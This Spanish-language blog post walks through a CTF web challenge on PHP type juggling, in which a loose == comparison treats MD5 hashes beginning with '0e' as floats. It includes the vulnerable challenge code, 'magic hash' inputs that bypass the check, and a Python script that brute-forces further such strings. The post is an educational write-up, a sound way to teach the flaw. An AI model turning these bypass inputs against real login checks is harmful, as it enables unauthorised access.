---
layout      : post
title       : "Type Juggling == PHP"
author      : lanz
image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_banner.png
category    : [ article ]
tags        : [ type-juggling, PHP ]
---
Jugaremos con la **pobre validaci贸n** que se hace a veces en formularios o procesos de `PHP`, estos llevados a cabo con `==` o `!=`.

...

En este art铆culo vamos a explorar una vulnerabilidad en c贸digos de `PHP` llamada `Type Juggling`.

Aprovechar茅 un reto de un **CTF** creado por **CERT RCTS** para explicar este tipo de vuln:

馃幉 **<u>Gracias</u>** [**<u>https://defendingthesoc.ctf.cert.rcts.pt/</u>**](https://defendingthesoc.ctf.cert.rcts.pt/).

...

D茅mosle...

1. [Descripci贸n y exploraci贸n del reto](#desc-chall).
  * [Exploramos y entendemos el c贸digo **PHP** del reto](#code-analysis).
  * [Hacemos algunos testeos en el programa](#testing-chall).
2. [Empezamos a conocernos con el **Type Juggling**](#juggling).
  * [驴Qu茅 jeso del **Type Juggling**?](#overview-juggling).
  * [Explotamos el **Type Juggling**](#exploit-juggling).
3. [Automatizamos la b煤squeda de la cadena que genera el bypass (**Type Juggling**)](#py-juggling).
4. [Referencias](#refs).

...

# Vemos el reto [#](#desc-chall) {#desc-chall}

**Some type of juggling**...

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_descriptionChall.png" style="display: block; margin-left: auto; margin-right: auto; width: 60%;"/>

Entramos al sitio web y obtenemos esto:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_juggling_home.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Nos provee con el c贸digo fuente de la web y adem谩s nos indica que debemos usar el par谩metro `hash` para obtener la flag.

El c贸digo fuente es este:

```php
<!DOCTYPE HTML>
<?php
    if(isset($_GET['source'])) {
        highlight_file(__FILE__);
        die();
    } else {
        $value = "240610708";
        if (isset($_GET['hash'])) {
            if ($_GET['hash'] === $value) {
                die('It is not THAT easy!');
            } 
            $hash = md5($_GET['hash']);
            $key = md5($value);
            if($hash == $key) {
                include('flag.php');
                print "Congratulations! Your flag is: $flag";
            } else {
                print "Flag not found!";
            }
        } 
    }
?>

<html>
  <head>
    <title>Challenge 1</title>
  </head>
  <body>
    <h2> Source code says it all</h2>
    <p>Try to get the flag using the 'hash' parameter</p>
    <a target="_blank" href="?source">See the source code</a>

  </body>
</html>
```

Bien, veamos r谩pidamente que hace el programa...

---

## Review del fuente <u>PHP</u> [馃搶](#code-analysis) {#code-analysis}

El c贸digo central en el que nos enfocaremos (y el importante) solo esta en esta parte:

```php
...
$value = "240610708";
if (isset($_GET['hash'])) {
    if ($_GET['hash'] === $value) {
        die('It is not THAT easy!');
    } 
    $hash = md5($_GET['hash']);
    $key = md5($value);
    if($hash == $key) {
        include('flag.php');
...
```

Inicialmente vemos que si le pasamos al par谩metro `hash` el valor `240610708` nos saltar铆a `It is not THAT easy!`... Esto ya que v谩lida si el valor y el **tipo de variable (int, float, string...)** son iguales.

* [Operadores de comparaci贸n en **PHP**](https://www.php.net/manual/es/language.operators.comparison.php).

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_operatorsComparision.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

En caso de no ser iguales y no ver el error, toma el valor del par谩metro y el de la variable `$value` y genera un **hash MD5** (***Message-Digest Algorithm 5***) para cada uno, que ese tipo de **hash** es muy usado para comprobar si un archivo ha sido modificado en alguna transmisi贸n o proceso.

* [Wikipedia - MD5](https://es.wikipedia.org/wiki/MD5).
* [驴Qu茅 es la funci贸n Hash del MD5 y es segura?](https://tecnonautas.net/que-es-la-funcion-hash-del-md5-y-es-segura/).

Y como paso final para obtener la flag, v谩lida que los hashes resultantes sean iguales, peeeeeeeeeeero solo su valor, no su tipo.

馃ぞ馃徔 **AC脕** es cuando empezamos a jugar...

---

## Hacemos algunos testeos [馃搶](#testing-chall) {#testing-chall}

Para entender que hace el c贸digo muuuucho mejor, creamos este con el que jugaremos toooodo el art铆culo.

```php
<?php
    $value = "240610708";
    $hash_get = "<vamos_a_jugar_con_esta_variable>";

    if ($hash_get === $value) {
        echo "It is not THAT easy!\n";
        exit(1);
    }

    $hash = md5($hash_get);
    $key = md5($value);

    echo "Value: " . $value . " - Hash: " . $key . "\n";
    echo "Hash_GET: " . $hash_get . " - Key: " . $hash . "\n";

    if ($key == $hash) {
        echo "\n[+] Iguales... 3st4{es_l4_fLA6}\n";
    } 
    else {
        echo "\n[-] No son iguales...\n";
    }
?>
```

Podemos pensar en enviar el valor `240610708` en el par谩metro, peeero como hay una comprobaci贸n entre esas dos variables antes de las del hash, vamos a entrar al `exit(1)`:

```html
http://challenges.defsoc.tk:8080?hash=240610708
```

```php
$value = "240610708";
$hash_get = "240610708";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_exit1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

As铆 que F.

Tambi茅n podr铆amos pensar en enviar el valor **MD5** de `240610708`, claramente pasar铆amos el primer `if`, pero 驴obtendr铆amos la flag? (驴qu茅 dices t煤 antes de ver la respuesta?)

```bash
鉂? echo -n "240610708" | md5sum
0e462097431906509019562988736854
```

```html
http://challenges.defsoc.tk:8080?hash=0e462097431906509019562988736854
```

```php
$value = "240610708";
$hash_get = "0e462097431906509019562988736854";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_sendHASHofVALUE_notSAME.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Exacto, no son iguales, ya que esta generando un hash nuevo con el valor `0e462097431906509019562988736854`, as铆 que tampoco es por ac谩...

Volviendo a la descripci贸n del reto nos habla de -"alg煤n tipo de **juggling**"- 驴khe? 

Investiguemos.

...

# Empezamos a jugar con el <u>Type Juggling</u> [#](#juggling) {#juggling}

...

## Hablamos un poquito de <u>Type Juggling</u> [馃搶](#overview-juggling) {#overview-juggling}

Buscando `juggling php` llegamos a esta brutal descripci贸n del propio manual de **PHP**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_google_ManualPHPdescriptionJuggling.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Perfecto, el primer p谩rrafo ya nos explica que es eso del "**juggling**" (**type juggling**), b谩sicamente es el juego entre tipos de variables, donde podemos definir una que sea tipo `int` (`$hola=1;`) pero despu茅s darle otro valor que cambie su tipo, por ejemplo `string` (`$hola="1";`) sin tener problemas.

Esto es interesante, porque si validamos los dos resultados, 驴ser铆an iguales? 馃槷 Claramente no, 驴cierto? Una es un entero y la otra es una string... Validemos:

```php
<?php
    $holaINT = 1;
    $holaSTRING = "1";

    if ($holaINT == $holaSTRING) {
        echo "Son iguales :o\n";
    }
    else {
        echo "No son iguales :)\n";
    }
?>
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_validationINTwithSTRING.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

WTF, 驴kheeeeeeeeeeee? (antes ya expliqu茅 la raz贸n, pero 驴la recuerdas?).

Apoyado en varios recursos vamos a entender que pasa ac谩 y como aprovecharnos de ello...

* [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09).
* [PHP Juggling type and magic hashes](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md).
* [Hashes "m谩gicos" en PHP (type jugling)](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html).

Todo viene de la comparaci贸n pobre que se hace al usar `== o !=`, que estar铆a diciendo: "v谩lida si las dos variables tienen el mismo valor", pero esta comparaci贸n no es estricta, por lo que no v谩lida si las dos tienen el mismo tipo de variable, en este caso si `int == string`, esto no lo hace, por eso nos muestra que son iguales 馃檭

...

Este comportamiento puede parecer a primera vista simplemente molesto, pero noooooooo, es causante de muuuuuuchos problemas y huecos en la seguridad...

El **peligro** puede llegar cuando aunque sea una de las variables que est谩n siendo comparadas, **es manipulada por el usuario**. Y que en el peor de los casos ese usuario tenga pensamientos de atacante 馃槇

En nuestro caso tenemos un simple redirect hacia `flag.php` si logramos jugar correctamente con el **Type Juggling**, pero en el mundo real estos problemas se ven un mont贸n en los `panel login`.

* [Ac谩 un ejemplo de un c贸digo vulnerable que maneja **cookies**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md#example-vulnerable-code).

Bueno, ya vimos que `1=="1"`, 驴pero qu茅 pasa si validamos `1=="1 y m谩s texto ac谩"`? 

Claramente no son iguales...

```php
<?php
    $holaINT = 1;
    $holaSTRING = "1 y m谩s texto ac谩";

    if ($holaINT == $holaSTRING) {
        echo "Son iguales :o\n";
    }
    else {
        echo "No son iguales :)\n";
    }
?>
```

Ejecutamos:

```bash
鉂? php test.php 
Son iguales :o
```

Jmmmmmmm, QUEEEEEEEEEEEEEE!! 

Lo que hace **PHP** ac谩 es que como el primer car谩cter de la cadena es el n煤mero de la otra variable (`1`), **lo extrae** y los dem谩s caracteres no le interesan, simplemente asimila que estamos comparando `1=="1"`, o sea la misma prueba que hicimos antes...

Obviamente si cambiamos la cadena a algo como:

```php
1=="a y m谩s 1 texto ac谩" --> No son iguales
1=="2 y m谩s texto ac谩"   --> No son iguales
```

Pues perfecto, ya entendimos como funciona un **Type Juggling**, veamos como obtener la flag jugando con 茅l.

---

## Explotamos el <u>Type Juggling</u> para conseguir la <u>flag</u> [馃搶](#exploit-juggling) {#exploit-juggling}

Algo que entendimos es que podemos generar el bypass simplemente consiguiendo que las dos variables sean del mismo tipo m谩s no con el mismo valor.

El **hash** con el que esta comparando nuestro input (`$_GET['hash']`) es este:

```php
0e462097431906509019562988736854
```

Que si usamos **PHP** para ver su tipo, nos mostrara que es una `string`, peeeeeeeeeero si **PHP** encuentra que el hash empieza con `0e` y el resto de su contenido es num茅rico, lo tratara como si su tipo de variable fuera `float` y no una `string` 馃樁

...

Con esto en mente, sabemos que tenemos que encontrar un valor que al obtener su **hash MD5**, primero empiece con `0e` y segundo que su contenido sean solo n煤meros... As铆, solo as铆, har铆amos que la validaci贸n de:

```php
<?php
    $value = "240610708";
    $hash_get = "<este_valor>";

    // md5($value) --> 0e462097431906509019562988736854 --> float
    // md5($hash_get) --> buscamos este valor numerico para que sea --> float

    // Y as铆 compare (float==float) y logremos ver la flag
    if ($key == $hash) {
        echo "[+] Iguales... 3st4{es_l4_fLA6}\n";
    } 
?>
```

Uff algo dif铆cil, 驴no?

En internet encontramos much铆simos valores con los que podr铆amos probar:

* [Ac谩 hay una graaaaaaaan lista de hashes **MD5** flotantes](https://github.com/spaze/hashes/blob/master/md5.md).

Si tomamos alguno, por ejemplo: `NOOPCJF` y lo probamos en nuestro `test.php`, generamos el bypass:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypasswith_NOOPCFJ_WEB.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

**Ya podr铆amos probar en la web y tambi茅n obtendr铆amos la flag, solo que ser铆a la del reto.**

Pero ta feo simplemente copiar y pegar, intentemos buscar una cadena nosotros mismos...

...

# Jugamos con <u>Python</u> para encontrar hash tipo <u>float</u> [#](#py-juggling) {#py-juggling}

Eso s铆, debemos tener paciencia, ya que tenemos que generar dos cosas importantes:

* Un hash que inicie con `0e`.
* Que el contenido despu茅s del `0e` sea 煤nicamente n煤meros.

Juguemos con cadenas **random**, as铆 mismo ser谩 la posibilidad de obtener r谩pido alg煤n hash con los criterios necesarios...

```py
#!/usr/bin/python3

import hashlib
import string
import random
import signal

# Funciones ---------------------------.
def def_handler(signal, frame):  # Controlamos salida con Ctrl+C
    print()
    exit()

signal.signal(signal.SIGINT, def_handler)

# Inicio del programa -----------------.
dic = string.ascii_letters + string.digits  # abc...xyzABC...XYZ0123456789
rand_index = list(range(7, 15))  # Generamos array: [7, 8 ... 13, 14]

while True:
    # Elegimos un numero aleatorio de nuestro array (entre 7 y 14), ese numero ser谩 el tama帽o de la cadena.
    # Y la cadena se construye con caracteres aleatorios del diccionario.
    random_value = ''.join(random.choices(dic, k=random.choice(rand_index)))
    # Generamos hash MD5 correspondiente al valor random.
    hash_random_value = hashlib.md5(random_value.encode('utf-8')).hexdigest()

    # Si el hash empieza con 0e, jugamos...
    if hash_random_value.startswith("0e"):
        # Extraemos todo lo que esta despues del 0e y validamos si su contenido es numerico.
        if hash_random_value[2:].isnumeric():
            # Si es numerico, tenemos el hash del texto que PHP interpreta como flotante.
            print(f"[+] Texto: {random_value} - Hash: {hash_random_value}")
            break
```

> [jugl.py](https://github.com/lanzt/blog/blob/main/assets/scripts/articles/typejuggling/jugl.py)

Si lo ejecutamos (lo dicho, d谩ndole tiempo) llegamos a obtener una cadena:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_juglPY_foundPOSSIBLEtext2bypass.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y si hacemos las respectivas prueeeebaas:

```php
$value = "240610708";路
$hash_get = "TP4KzMGZ";
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_testPHP_bypassWITHstringOFpy.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Opa, es v谩lidooooooooooo, si lo probamos ahora contra el sitio real:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/typejuggling/juggling_RCTS2021web_bypassWITHscriptOFpy_flag.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;"/>

Y listoos, hemos bypasseado la validaci贸n de hashes aprovechando la pobre comparaci贸n que `PHP` hace al usar `==` y no `===`. Esto para hacer un match en cuanto a los tipos de variables aunque el contenido de ellas sea distinto.

...

# Referencias [#](#refs) {#refs}

---

* [Magic Hashes](https://www.whitehatsec.com/blog/magic-hashes/), whitehatsec.
* [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09), medium/swlh.
* [PHP Juggling type and magic hashes](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Type%20Juggling/README.md), github/PayloadAllTheThings.
* [PDF - PHP Magic Tricks: Type Juggling](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf), owasp.
* [Hashes "m谩gicos" en PHP (type jugling)](https://www.hackplayers.com/2018/03/hashes-magicos-en-php-type-jugling.html), hackplayers.

...

Como dije al inicio, esta vulnerabilidad puede verse "peque帽a" en estos entornos de -ver flags-, pero las pobres comparaciones (`==` o `!=`) se ven mucho en `logins`, ah铆 es donde reside el verdadero terror de esto, ya que podemos bypassear a lo loco.

Espero que haya sido de utilidad este post y como siempre digo, a seguir rompiendo de todoooooooooooooo (pero con cuidadito y con respeto).